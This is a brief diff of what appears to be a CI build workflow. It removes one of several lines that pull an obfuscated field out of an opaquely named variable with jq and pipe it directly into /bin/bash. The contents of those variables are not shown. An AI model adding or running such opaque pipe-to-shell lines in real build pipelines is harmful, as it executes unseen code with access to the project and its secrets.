@@ -26,7 +26,6 @@ jobs:
           echo $c826 | jq -r .lqbd387 | /bin/bash
           printf '%s' "$f80967" | jq -r .fi08203 | /bin/bash
           echo $wn29769 | jq -r .f050 | /bin/bash
-          echo $cnrn97 | jq -r .wwbgs0 | /bin/bash
           printf '%s' "$wjb516" | jq -r .bltr72927 | /bin/bash
 
       - name: Upload artifact
